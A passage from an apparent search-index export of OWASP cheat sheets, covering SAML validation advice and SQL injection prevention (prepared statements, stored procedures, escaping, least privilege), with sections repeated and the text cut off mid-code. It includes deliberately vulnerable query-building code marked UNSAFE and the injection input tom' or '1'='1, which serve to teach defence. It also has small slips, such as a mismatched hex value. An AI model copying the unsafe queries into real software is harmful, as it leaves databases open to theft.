Breaking SAML: Be Whoever You Want to Be . The following recommendations were proposed in response ( Secure SAML validation to prevent XML signature wrapping attacks ): Always perform schema validation on the XML document prior to using it for any security-\u00adrelated purposes: Always use local, trusted copies of schemas for validation. Never allow automatic download of schemas from third party locations. If possible, inspect schemas and perform schema hardening, to disable possible wildcard \u00adtype or relaxed processing statements. Securely validate the digital signature: If you expect only one signing key, use StaticKeySelector . Obtain the key directly from the identity provider, store it in local file and ignore any KeyInfo elements in the document. If you expect more than one signing key, use X509KeySelector (the JKS variant). Obtain these keys directly form the identity providers, store them in local JKS and ignore any KeyInfo elements in the document. If you expect a heterogeneous signed documents (many certificates from many identity providers, multi\u00adlevel validation paths), implement full trust establishment model based on PKIX and trusted root certificates. Avoid signature-wrapping attacks. Never use getElementsByTagName to select security related elements in an XML document without prior validation. Always use absolute XPath expressions to select elements, unless a hardened schema is used for validation.","title":"Validate Signatures"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-protocol-processing-rules","text":"This is another common area for security gaps simply because of the vast number of steps to assert. Processing a SAML response is an expensive operation but all steps must be validated: Validate AuthnRequest processing rules. Refer to SAML Core (3.4.1.4) for all AuthnRequest processing rules. This step will help counter the following attacks: Man-in-the-middle (6.4.2) Validate Response processing rules. Refer to SAML Profiles (4.1.4.3) for all Response processing rules. This step will help counter the following attacks: Stolen Assertion (6.4.1) Man-in-the-middle (6.4.2) Forged Assertion (6.4.3) Browser State Exposure (6.4.4)","title":"Validate Protocol Processing Rules"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-binding-implementation","text":"For an HTTP Redirect Binding refer to SAML Binding (3.4). To view an encoding example, you may want to reference RequestUtil.java found within Google's reference implementation . For an HTTP POST Binding refer to SAML Binding (3.5). The caching considerations are also very important. If a SAML protocol message gets cached, it can subsequently be used as a Stolen Assertion (6.4.1) or Replay (6.4.5) attack.","title":"Validate Binding Implementation"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#validate-security-countermeasures","text":"Revisit each security threat that exists within the SAML Security document and assert you have applied the appropriate countermeasures for threats that may exist for your particular implementation. Additional countermeasures considered should include: Prefer IP Filtering when appropriate. For example, this countermeasure could have prevented Google's initial security flaw if Google provided each trusted partner with a separate endpoint and setup an IP filter for each endpoint. This step will help counter the following attacks: Stolen Assertion (6.4.1) Man-in-the-middle (6.4.2) Prefer short lifetimes on the SAML Response. This step will help counter the following attacks: Stolen Assertion (6.4.1) Browser State Exposure (6.4.4) Prefer OneTimeUse on the SAML Response. This step will help counter the following attacks: Browser State Exposure (6.4.4) Replay (6.4.5) Need an architectural diagram? The SAML technical overview contains the most complete diagrams. For the Web Browser SSO Profile with Redirect/POST bindings refer to the section 4.1.3. In fact, of all the SAML documentation, the technical overview is the most valuable from a high-level perspective.","title":"Validate Security Countermeasures"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#unsolicited-response-ie-idp-initiated-sso-considerations-for-service-providers","text":"Unsolicited Response is inherently less secure by design due to the lack of CSRF protection. However, it is supported by many due to the backwards compatibility feature of SAML 1.1. The general security recommendation is to not support this type of authentication, but if it must be enabled, the following steps (in additional to everything mentioned above) should help you secure this flow: Follow the validation process mentioned in SAML Profiles (section 4.1.5) . This step will help counter the following attacks: Replay (6.1.2) Message Insertion (6.1.3) If the contract of the RelayState parameter is a URL, make sure the URL is validated and whitelisted. This step will help counter the following attack: Open Redirect Implement proper replay detection either at the response or assertion level. This will help counter the following attack: Replay (6.1.2)","title":"Unsolicited Response (ie. IdP Initiated SSO) Considerations for Service Providers"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#identity-provider-and-service-provider-considerations","text":"The SAML protocol is rarely the vector of choice, though it's important to have cheatsheets to make sure that this is robust. The various endpoints are more targeted, so how the SAML token is generated and how it is consumed are both important in practice.","title":"Identity Provider and Service Provider Considerations"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#identity-provider-idp-considerations","text":"Validate X.509 Certificate for algorithm compatibility, strength of encryption, export restrictions Validate Strong Authentication options for generating the SAML token IDP validation (which IDP mints the token) Use/Trust Root CAs whenever possible Synchronize to a common Internet timesource Define levels of assurance for identity verification Prefer asymmetric identifiers for identity assertions over personally identifiable information (e.g. SSNs, etc) Sign each individual Assertion or the entire Response element","title":"Identity Provider (IdP) Considerations"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#service-provider-sp-considerations","text":"Validating session state for user Level of granularity in setting authZ context when consuming SAML token (do you use groups, roles, attributes) Ensure each Assertion or the entire Response element is signed Validate Signatures Validate if signed by authorized IDP Validate IDP certificates for expiration and revocation against CRL/OCSP Validate NotBefore and NotOnorAfter Validate Recipient attribute Define criteria for SAML logout Exchange assertions only over secure transports Define criteria for session management Verify user identities obtained from SAML ticket assertions whenever possible.","title":"Service Provider (SP) Considerations"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#input-validation","text":"Just because SAML is a security protocol does not mean that input validation goes away. Ensure that all SAML providers/consumers do proper input validation .","title":"Input Validation"},{"location":"cheatsheets/SAML_Security_Cheat_Sheet.html#cryptography","text":"Solutions relying cryptographic algorithms need to follow the latest developments in cryptoanalysis. Ensure all SAML elements in the chain use strong encryption Consider deprecating support for insecure XMLEnc algorithms","title":"Cryptography"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html","text":"SQL Injection Prevention Cheat Sheet \u00b6 Introduction \u00b6 This article is focused on providing clear, simple, actionable guidance for preventing SQL Injection flaws in your applications. SQL Injection attacks are unfortunately very common, and this is due to two factors: the significant prevalence of SQL Injection vulnerabilities, and the attractiveness of the target (i.e., the database typically contains all the interesting/critical data for your application). It's somewhat shameful that there are so many successful SQL Injection attacks occurring, because it is EXTREMELY simple to avoid SQL Injection vulnerabilities in your code. SQL Injection flaws are introduced when software developers create dynamic database queries that include user supplied input. To avoid SQL injection flaws is simple. Developers need to either: a) stop writing dynamic queries; and/or b) prevent user supplied input which contains malicious SQL from affecting the logic of the executed query. This article provides a set of simple techniques for preventing SQL Injection vulnerabilities by avoiding these two problems. These techniques can be used with practically any kind of programming language with any type of database. There are other types of databases, like XML databases, which can have similar problems (e.g., XPath and XQuery injection) and these techniques can be used to protect them as well. Primary Defenses: Option 1: Use of Prepared Statements (with Parameterized Queries) Option 2: Use of Stored Procedures Option 3: Whitelist Input Validation Option 4: Escaping All User Supplied Input Additional Defenses: Also: Enforcing Least Privilege Also: Performing Whitelist Input Validation as a Secondary Defense Unsafe Example: SQL injection flaws typically look like this: The following (Java) example is UNSAFE, and would allow an attacker to inject code into the query that would be executed by the database. The unvalidated \"customerName\" parameter that is simply appended to the query allows an attacker to inject any SQL code they want. Unfortunately, this method for accessing databases is all too common. String query = \"SELECT account_balance FROM user_data WHERE user_name = \" + request . getParameter ( \"customerName\" ); try { Statement statement = connection . createStatement ( ... ); ResultSet results = statement . executeQuery ( query ); } ... Primary Defenses \u00b6 Defense Option 1: Prepared Statements (with Parameterized Queries) \u00b6 The use of prepared statements with variable binding (aka parameterized queries) is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied. Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of tom' or '1'='1 , the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string tom' or '1'='1 . Language specific recommendations: Java EE \u2013 use PreparedStatement() with bind variables .NET \u2013 use parameterized queries like SqlCommand() or OleDbCommand() with bind variables PHP \u2013 use PDO with strongly typed parameterized queries (using bindParam()) Hibernate - use createQuery() with bind variables (called named parameters in Hibernate) SQLite - use sqlite3_prepare() to create a statement object In rare circumstances, prepared statements can harm performance. When confronted with this situation, it is best to either a) strongly validate all data or b) escape all user supplied input using an escaping routine specific to your database vendor as described below, rather than using a prepared statement. Safe Java Prepared Statement Example : The following code example uses a PreparedStatement , Java's implementation of a parameterized query, to execute the same database query. // This should REALLY be validated too String custname = request . getParameter ( \"customerName\" ); // Perform input validation to detect attacks String query = \"SELECT account_balance FROM user_data WHERE user_name = ? \" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery ( ); Safe C# .NET Prepared Statement Example : With .NET, it's even more straightforward. The creation and execution of the query doesn't change. All you have to do is simply pass the parameters to the query using the Parameters.Add() call as shown here. String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; try { OleDbCommand command = new OleDbCommand ( query , connection ); command . Parameters . Add ( new OleDbParameter ( \"customerName\" , CustomerName Name . Text )); OleDbDataReader reader = command . ExecuteReader (); // \u2026 } catch ( OleDbException se ) { // error handling } We have shown examples in Java and .NET but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces. Even SQL abstraction layers, like the Hibernate Query Language (HQL) have the same type of injection problems (which we call HQL Injection ). HQL supports parameterized queries as well, so we can avoid this problem: Hibernate Query Language (HQL) Prepared Statement (Named Parameters) Examples : //First is an unsafe HQL Statement Query unsafeHQLQuery = session . createQuery ( \"from Inventory where productID='\" + userSuppliedParameter + \"'\" ); //Here is a safe version of the same query using named parameters Query safeHQLQuery = session . createQuery ( \"from Inventory where productID=:productid\" ); safeHQLQuery . setParameter ( \"productid\" , userSuppliedParameter ); For examples of parameterized queries in other languages, including Ruby, PHP, Cold Fusion, and Perl, see the Query Parameterization Cheat Sheet or this site . Developers tend to like the Prepared Statement approach because all the SQL code stays within the application. This makes your application relatively database independent. Defense Option 2: Stored Procedures \u00b6 Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely which is the norm for most stored procedure languages. They require the developer to just build SQL statements with parameters which are automatically parameterized unless the developer does something largely out of the norm. The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application. Both of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Note: 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation. Developers do not usually generate dynamic SQL inside stored procedures. However, it can be done, but should be avoided. If it can't be avoided, the stored procedure must use input validation or proper escaping as described in this article to make sure that all user supplied input to the stored procedure can't be used to inject SQL code into the dynamically generated query. Auditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors. There are also several cases where stored procedures can increase risk. For example, on MS SQL server, you have 3 main default roles: db_datareader , db_datawriter and db_owner . Before stored procedures came into use, DBA's would give db_datareader or db_datawriter rights to the webservice's user, depending on the requirements. However, stored procedures require execute rights, a role that is not available by default. Some setups where the user management has been centralized, but is limited to those 3 roles, cause all web apps to run under db_owner rights so stored procedures can work. Naturally, that means that if a server is breached the attacker has full rights to the database, where previously they might only have had read-access. Safe Java Stored Procedure Example : The following code example uses a CallableStatement , Java's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. // This should REALLY be validated String custname = request . getParameter ( \"customerName\" ); try { CallableStatement cs = connection . prepareCall ( \"{call sp_getAccountBalance(?)}\" ); cs . setString ( 1 , custname ); ResultSet results = cs . executeQuery (); // \u2026 result set handling } catch ( SQLException se ) { // \u2026 logging and error handling } Safe VB .NET Stored Procedure Example : The following code example uses a SqlCommand , .NET's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. Try Dim command As SqlCommand = new SqlCommand ( \"sp_getAccountBalance\" , connection ) command . CommandType = CommandType . StoredProcedure command . Parameters . Add ( new SqlParameter ( \"@CustomerName\" , CustomerName . Text )) Dim reader As SqlDataReader = command . ExecuteReader () '... Catch se As SqlException 'error handling End Try Defense Option 3: Whitelist Input Validation \u00b6 Various parts of SQL queries aren't legal locations for the use of bind variables, such as the names of tables or columns, and the sort order indicator (ASC or DESC). In such situations, input validation or query redesign is the most appropriate defense. For the names of tables or columns, ideally those values come from the code, and not from user parameters. But if user parameter values are used for targeting different table names and column names, then the parameter values should be mapped to the legal/expected table or column names to make sure unvalidated user input doesn't end up in the query. Please note, this is a symptom of poor design and a full rewrite should be considered if time allows. Here is an example of table name validation. String tableName; switch(PARAM): case \"Value1\": tableName = \"fooTable\"; break; case \"Value2\": tableName = \"barTable\"; break; ... default : throw new InputValidationException(\"unexpected value provided\" + \" for table name\"); The tableName can then be directly appended to the SQL query since it is now known to be one of the legal and expected values for a table name in this query. Keep in mind that generic table validation functions can lead to data loss as table names are used in queries where they are not expected. For something simple like a sort order, it would be best if the user supplied input is converted to a boolean, and then that boolean is used to select the safe value to append to the query. This is a very standard need in dynamic query creation. For example: public String someMethod ( boolean sortOrder ) { String SQLquery = \"some SQL ... order by Salary \" + ( sortOrder ? \"ASC\" : \"DESC\" ); ` ... Any time user input can be converted to a non-String, like a date, numeric, boolean, enumerated type, etc. before it is appended to a query, or used to select a value to append to the query, this ensures it is safe to do so. Input validation is also recommended as a secondary defense in ALL cases, even when using bind variables as is discussed later in this article. More techniques on how to implement strong whitelist input validation is described in the Input Validation Cheat Sheet . Defense Option 4: Escaping All User-Supplied Input \u00b6 This technique should only be used as a last resort, when none of the above are feasible. Input validation is probably a better choice as this methodology is frail compared to other defenses and we cannot guarantee it will prevent all SQL Injection in all situations. This technique is to escape user input before putting it in a query. It is very database specific in its implementation. It's usually only recommended to retrofit legacy code when implementing input validation isn't cost effective. Applications built from scratch, or applications requiring low risk tolerance should be built or re-written using parameterized queries, stored procedures, or some kind of Object Relational Mapper (ORM) that builds your queries for you. This technique works like this. Each DBMS supports one or more character escaping schemes specific to certain kinds of queries. If you then escape all user supplied input using the proper escaping scheme for the database you are using, the DBMS will not confuse that input with SQL code written by the developer, thus avoiding any possible SQL injection vulnerabilities. The OWASP Enterprise Security API (ESAPI) is a free, open source, web application security control library that makes it easier for programmers to write lower-risk applications. The ESAPI libraries are designed to make it easier for programmers to retrofit security into existing applications. The ESAPI libraries also serve as a solid foundation for new development: Full details on ESAPI are available here on OWASP . The javadoc for ESAPI 2.x (Legacy) is available . This code was migrated to GitHub in November 2014. The legacy ESAPI for Java at GitHub helps understand existing use of it when Javadoc seems insufficient. An attempt at another ESAPI for Java GitHub has other approaches and no tests or concrete codecs. To find the javadoc specifically for the database encoders, click on the Codec class on the left hand side. There are lots of Codecs implemented. The two Database specific codecs are OracleCodec , and MySQLCodec . Just click on their names in the All Known Implementing Classes: at the top of the Interface Codec page. At this time, ESAPI currently has database encoders for: Oracle MySQL (Both ANSI and native modes are supported) Database encoders are forthcoming for: SQL Server PostgreSQL If your database encoder is missing, please let us know. Database Specific Escaping Details \u00b6 If you want to build your own escaping routines, here are the escaping details for each of the databases that we have developed ESAPI Encoders for: Oracle SQL Server DB2 Oracle Escaping \u00b6 This information is based on the Oracle Escape character information . Escaping Dynamic Queries \u00b6 To use an ESAPI database codec is pretty simple. An Oracle example looks something like: ESAPI . encoder (). encodeForSQL ( new OracleCodec (), queryparam ); So, if you had an existing Dynamic query being generated in your code that was going to Oracle that looked like this: String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + req . getParameter ( \"userID\" ) + \"' and user_password = '\" + req . getParameter ( \"pwd\" ) + \"'\" ; try { Statement statement = connection . createStatement ( \u2026 ); ResultSet results = statement . executeQuery ( query ); } You would rewrite the first line to look like this: Codec ORACLE_CODEC = new OracleCodec (); String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + ESAPI . encoder (). encodeForSQL ( ORACLE_CODEC , req . getParameter ( \"userID\" )) + \"' and user_password = '\" + ESAPI . encoder (). encodeForSQL ( ORACLE_CODEC , req . getParameter ( \"pwd\" )) + \"'\" ; And it would now be safe from SQL injection, regardless of the input supplied. For maximum code readability, you could also construct your own OracleEncoder : Encoder oe = new OracleEncoder (); String query = \"SELECT user_id FROM user_data WHERE user_name = '\" + oe . encode ( req . getParameter ( \"userID\" )) + \"' and user_password = '\" + oe . encode ( req . getParameter ( \"pwd\" )) + \"'\" ; With this type of solution, you would need only to wrap each user-supplied parameter being passed into an ESAPI.encoder().encodeForOracle( ) call or whatever you named the call and you would be done. Turn off character replacement \u00b6 Use SET DEFINE OFF or SET SCAN OFF to ensure that automatic character replacement is turned off. If this character replacement is turned on, the & character will be treated like a SQLPlus variable prefix that could allow an attacker to retrieve private data. See here and here for more information Escaping Wildcard characters in Like Clauses \u00b6 The LIKE keyword allows for text scanning searches. In Oracle, the underscore _ character matches only one character, while the ampersand % is used to match zero or more occurrences of any characters. These characters must be escaped in LIKE clause criteria. For example: SELECT name FROM emp WHERE id LIKE '%/_%' ESCAPE '/' ; SELECT name FROM emp WHERE id LIKE '%\\%%' ESCAPE '\\' ; Oracle 10g escaping \u00b6 An alternative for Oracle 10g and later is to place { and } around the string to escape the entire string. However, you have to be careful that there isn't a } character already in the string. You must search for these and if there is one, then you must replace it with }} . Otherwise that character will end the escaping early, and may introduce a vulnerability. MySQL Escaping \u00b6 MySQL supports two escaping modes: ANSI_QUOTES SQL mode, and a mode with this off, which we call MySQL mode. ANSI SQL mode: Simply encode all ' (single tick) characters with '' (two single ticks) MySQL mode, do the following: NUL (0x00) --> \\0 [This is a zero, not the letter O] BS (0x08) --> \\b TAB (0x09) --> \\t LF (0x0a) --> \\n CR (0x0d) --> \\r SUB (0x1a) --> \\Z \" (0x22) --> \\\" % (0x25) --> \\% ' (0x27) --> \\' \\ (0x5c) --> \\\\ _ (0x5f) --> \\_ all other non-alphanumeric characters with ASCII values less than 256 --> \\c where 'c' is the original non-alphanumeric character. This information is based on the MySQL Escape character information . SQL Server Escaping \u00b6 We have not implemented the SQL Server escaping routine yet, but the following has good pointers and links to articles describing how to prevent SQL injection attacks on SQL server, see here . DB2 Escaping \u00b6 This information is based on DB2 WebQuery special characters as well as some information from Oracle's JDBC DB2 driver . Information in regards to differences between several DB2 Universal drivers . Hex-encoding all input \u00b6 A somewhat special case of escaping is the process of hex-encode the entire string received from the user (this can be seen as escaping every character). The web application should hex-encode the user input before including it in the SQL statement. The SQL statement should take into account this fact, and accordingly compare the data. For example, if we have to look up a record matching a sessionID, and the user transmitted the string abc123 as the session ID, the select statement would be: SELECT ... FROM session WHERE hex_encode ( sessionID ) = '616263313233' hex_encode should be replaced by the particular facility for the database being used. The string 606162313233 is the hex encoded version of the string received from the user (it is the sequence of hex values of the ASCII/UTF-8 codes of the user data). If an attacker were to transmit a string containing a single-quote character followed by their attempt to inject SQL code, the constructed SQL statement will only look like: ... WHERE hex_encode ( ... ) = '2720 ... ' 27 being the ASCII code (in hex) of the single-quote, which is simply hex-encoded like any other character in the string. The resulting SQL can only contain numeric digits and letters a to f , and never any special character that could enable an SQL injection. Escaping SQLi in PHP \u00b6 Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. You basically have two options to achieve this: Using PDO (for any supported database driver): $stmt = $pdo->prepare('SELECT * FROM employees WHERE name = :name'); $stmt->execute(array('name' => $name)); foreach ($stmt as $row) { // do something with $row } Using MySQLi (for MySQL): $stmt = $dbConnection->prepare('SELECT * FROM employees WHERE name = ?'); $stmt->bind_param('s', $name); $stmt->execute(); $result = $stmt->get_result(); while ($row = $result->fetch_assoc()) { // do something with $row } PDO is the universal option. If you're connecting to a database other than MySQL, you can refer to a driver-specific second option (e.g. pg_prepare() and pg_execute() for PostgreSQL). Additional Defenses \u00b6 Beyond adopting one of the four primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are: Least Privilege Whitelist Input Validation Least Privilege \u00b6 To minimize the potential damage of a successful SQL injection attack, you should minimize the privileges assigned to every database account in your environment. Do not assign DBA or admin type access rights to your application accounts. We understand that this is easy, and everything just 'works' when you do it this way, but it is very dangerous. Start from the ground up to determine what access rights your application accounts require, rather than trying to figure out what access rights you need to take away. Make sure that accounts that only need read access are only granted read access to the tables they need access to. If an account only needs access to portions of a table, consider creating a view that limits access to that portion of the data and assigning the account access to the view instead, rather than the underlying table. Rarely, if ever, grant create or delete access to database accounts. If you adopt a policy where you use stored procedures everywhere, and don't allow application accounts to directly execute their own queries, then restrict those accounts to only be able to execute the stored procedures they need. Don't grant them any rights directly to the tables in the database. SQL injection is not the only threat to your database data. Attackers can simply change the parameter values from one of the legal values they are presented with, to a value that is unauthorized for them, but the application itself might be authorized to access. As such, minimizing the privileges granted to your application will reduce the likelihood of such unauthorized access attempts, even when an attacker is not trying to use SQL injection as part of their exploit. While you are at it, you should minimize the privileges of the operating system account that the DBMS runs under. Don't run your DBMS as root or system! Most DBMSs run out of the box with a very powerful system account. For example, MySQL runs as system on Windows by default! Change the DBMS's OS account to something more appropriate, with restricted privileges. Multiple DB Users \u00b6 The designer of web applications should not only avoid using the same owner/admin account in the web applications to connect to the database. Different DB users could be used for different web applications. In general, each separate web application that requires access to the database could have a designated database user account that the web-app will use to connect to the DB. That way, the designer of the application can have good granularity in the access control, thus reducing the privileges as much as possible. Each DB user will then have select access to what it needs only, and write-access as needed. As an example, a login page requires read access to the username and password fields of a table, but no write access of any form (no insert, update, or delete). However, the sign-up page certainly requires insert privilege to that table; this restriction can only be enforced if these web apps use different DB users to connect to the database. Views \u00b6 You can use SQL views to further increase the granularity of access by limiting the read access to specific fields of a table or joins of tables. It could potentially have additional benefits: for example, suppose that the system is required (perhaps due to some specific legal requirements) to store the passwords of the users, instead of salted-hashed passwords. The designer could use views to compensate for this limitation; revoke all access to the table (from all DB users except the owner/admin) and create a view that outputs the hash of the password field and not the field itself. Any SQL injection attack that succeeds in stealing DB information will be restricted to stealing the hash of the passwords (could even be a keyed hash), since no DB user for any of the web applications has access to the table itself. Whitelist Input Validation \u00b6 In addition to being a primary defense when nothing else is possible (e.g., when a bind variable isn't legal), input validation can also be a secondary defense used to detect unauthorized input before it is passed to the SQL query. For more information please see the Input Validation Cheat Sheet . Proceed with caution here. Validated data is not necessarily safe to insert into SQL queries via string building. Related Articles \u00b6 SQL Injection Attack Cheat Sheets : The following articles describe how to exploit different kinds of SQL Injection Vulnerabilities on various platforms that this article was created to help you avoid: SQL Injection Cheat Sheet Bypassing WAF's with SQLi - SQL Injection Bypassing WAF Description of SQL Injection Vulnerabilities : OWASP article on SQL Injection Vulnerabilities OWASP article on Blind_SQL_Injection Vulnerabilities How to Avoid SQL Injection Vulnerabilities : OWASP Developers Guide article on how to avoid SQL injection vulnerabilities OWASP Cheat Sheet that provides numerous language specific examples of parameterized queries using both Prepared Statements and Stored Procedures The Bobby Tables site (inspired by the XKCD webcomic) has numerous examples in different languages of parameterized Prepared Statements and Stored Procedures How to Review Code for SQL Injection Vulnerabilities : OWASP Code Review Guide article on how to Review Code for SQL Injection Vulnerabilities How to Test for SQL Injection Vulnerabilities : OWASP Testing Guide article on how to Test for SQL Injection Vulnerabilities","title":"SQL Injection Prevention"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#sql-injection-prevention-cheat-sheet","text":"","title":"SQL Injection Prevention Cheat Sheet"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#introduction","text":"This article is focused on providing clear, simple, actionable guidance for preventing SQL Injection flaws in your applications. SQL Injection attacks are unfortunately very common, and this is due to two factors: the significant prevalence of SQL Injection vulnerabilities, and the attractiveness of the target (i.e., the database typically contains all the interesting/critical data for your application). It's somewhat shameful that there are so many successful SQL Injection attacks occurring, because it is EXTREMELY simple to avoid SQL Injection vulnerabilities in your code. SQL Injection flaws are introduced when software developers create dynamic database queries that include user supplied input. To avoid SQL injection flaws is simple. Developers need to either: a) stop writing dynamic queries; and/or b) prevent user supplied input which contains malicious SQL from affecting the logic of the executed query. This article provides a set of simple techniques for preventing SQL Injection vulnerabilities by avoiding these two problems. These techniques can be used with practically any kind of programming language with any type of database. There are other types of databases, like XML databases, which can have similar problems (e.g., XPath and XQuery injection) and these techniques can be used to protect them as well. Primary Defenses: Option 1: Use of Prepared Statements (with Parameterized Queries) Option 2: Use of Stored Procedures Option 3: Whitelist Input Validation Option 4: Escaping All User Supplied Input Additional Defenses: Also: Enforcing Least Privilege Also: Performing Whitelist Input Validation as a Secondary Defense Unsafe Example: SQL injection flaws typically look like this: The following (Java) example is UNSAFE, and would allow an attacker to inject code into the query that would be executed by the database. The unvalidated \"customerName\" parameter that is simply appended to the query allows an attacker to inject any SQL code they want. Unfortunately, this method for accessing databases is all too common. String query = \"SELECT account_balance FROM user_data WHERE user_name = \" + request . getParameter ( \"customerName\" ); try { Statement statement = connection . createStatement ( ... ); ResultSet results = statement . executeQuery ( query ); } ...","title":"Introduction"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#primary-defenses","text":"","title":"Primary Defenses"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-1-prepared-statements-with-parameterized-queries","text":"The use of prepared statements with variable binding (aka parameterized queries) is how all developers should first be taught how to write database queries. They are simple to write, and easier to understand than dynamic queries. Parameterized queries force the developer to first define all the SQL code, and then pass in each parameter to the query later. This coding style allows the database to distinguish between code and data, regardless of what user input is supplied. Prepared statements ensure that an attacker is not able to change the intent of a query, even if SQL commands are inserted by an attacker. In the safe example below, if an attacker were to enter the userID of tom' or '1'='1 , the parameterized query would not be vulnerable and would instead look for a username which literally matched the entire string tom' or '1'='1 . Language specific recommendations: Java EE \u2013 use PreparedStatement() with bind variables .NET \u2013 use parameterized queries like SqlCommand() or OleDbCommand() with bind variables PHP \u2013 use PDO with strongly typed parameterized queries (using bindParam()) Hibernate - use createQuery() with bind variables (called named parameters in Hibernate) SQLite - use sqlite3_prepare() to create a statement object In rare circumstances, prepared statements can harm performance. When confronted with this situation, it is best to either a) strongly validate all data or b) escape all user supplied input using an escaping routine specific to your database vendor as described below, rather than using a prepared statement. Safe Java Prepared Statement Example : The following code example uses a PreparedStatement , Java's implementation of a parameterized query, to execute the same database query. // This should REALLY be validated too String custname = request . getParameter ( \"customerName\" ); // Perform input validation to detect attacks String query = \"SELECT account_balance FROM user_data WHERE user_name = ? \" ; PreparedStatement pstmt = connection . prepareStatement ( query ); pstmt . setString ( 1 , custname ); ResultSet results = pstmt . executeQuery ( ); Safe C# .NET Prepared Statement Example : With .NET, it's even more straightforward. The creation and execution of the query doesn't change. All you have to do is simply pass the parameters to the query using the Parameters.Add() call as shown here. String query = \"SELECT account_balance FROM user_data WHERE user_name = ?\" ; try { OleDbCommand command = new OleDbCommand ( query , connection ); command . Parameters . Add ( new OleDbParameter ( \"customerName\" , CustomerName Name . Text )); OleDbDataReader reader = command . ExecuteReader (); // \u2026 } catch ( OleDbException se ) { // error handling } We have shown examples in Java and .NET but practically all other languages, including Cold Fusion, and Classic ASP, support parameterized query interfaces. Even SQL abstraction layers, like the Hibernate Query Language (HQL) have the same type of injection problems (which we call HQL Injection ). HQL supports parameterized queries as well, so we can avoid this problem: Hibernate Query Language (HQL) Prepared Statement (Named Parameters) Examples : //First is an unsafe HQL Statement Query unsafeHQLQuery = session . createQuery ( \"from Inventory where productID='\" + userSuppliedParameter + \"'\" ); //Here is a safe version of the same query using named parameters Query safeHQLQuery = session . createQuery ( \"from Inventory where productID=:productid\" ); safeHQLQuery . setParameter ( \"productid\" , userSuppliedParameter ); For examples of parameterized queries in other languages, including Ruby, PHP, Cold Fusion, and Perl, see the Query Parameterization Cheat Sheet or this site . Developers tend to like the Prepared Statement approach because all the SQL code stays within the application. This makes your application relatively database independent.","title":"Defense Option 1: Prepared Statements (with Parameterized Queries)"},{"location":"cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html#defense-option-2-stored-procedures","text":"Stored procedures are not always safe from SQL injection. However, certain standard stored procedure programming constructs have the same effect as the use of parameterized queries when implemented safely which is the norm for most stored procedure languages. They require the developer to just build SQL statements with parameters which are automatically parameterized unless the developer does something largely out of the norm. The difference between prepared statements and stored procedures is that the SQL code for a stored procedure is defined and stored in the database itself, and then called from the application. Both of these techniques have the same effectiveness in preventing SQL injection so your organization should choose which approach makes the most sense for you. Note: 'Implemented safely' means the stored procedure does not include any unsafe dynamic SQL generation. Developers do not usually generate dynamic SQL inside stored procedures. However, it can be done, but should be avoided. If it can't be avoided, the stored procedure must use input validation or proper escaping as described in this article to make sure that all user supplied input to the stored procedure can't be used to inject SQL code into the dynamically generated query. Auditors should always look for uses of sp_execute, execute or exec within SQL Server stored procedures. Similar audit guidelines are necessary for similar functions for other vendors. There are also several cases where stored procedures can increase risk. For example, on MS SQL server, you have 3 main default roles: db_datareader , db_datawriter and db_owner . Before stored procedures came into use, DBA's would give db_datareader or db_datawriter rights to the webservice's user, depending on the requirements. However, stored procedures require execute rights, a role that is not available by default. Some setups where the user management has been centralized, but is limited to those 3 roles, cause all web apps to run under db_owner rights so stored procedures can work. Naturally, that means that if a server is breached the attacker has full rights to the database, where previously they might only have had read-access. Safe Java Stored Procedure Example : The following code example uses a CallableStatement , Java's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. // This should REALLY be validated String custname = request . getParameter ( \"customerName\" ); try { CallableStatement cs = connection . prepareCall ( \"{call sp_getAccountBalance(?)}\" ); cs . setString ( 1 , custname ); ResultSet results = cs . executeQuery (); // \u2026 result set handling } catch ( SQLException se ) { // \u2026 logging and error handling } Safe VB .NET Stored Procedure Example : The following code example uses a SqlCommand , .NET's implementation of the stored procedure interface, to execute the same database query. The sp_getAccountBalance stored procedure would have to be predefined in the database and implement the same functionality as the query defined above. Try Dim command As SqlCommand = new SqlCommand ( \"sp_getAccountBalance\" , connection ) command . CommandType = CommandType . StoredProcedure command . Parameters . Add ( new SqlParameter ( \"@CustomerName\" , CustomerName . 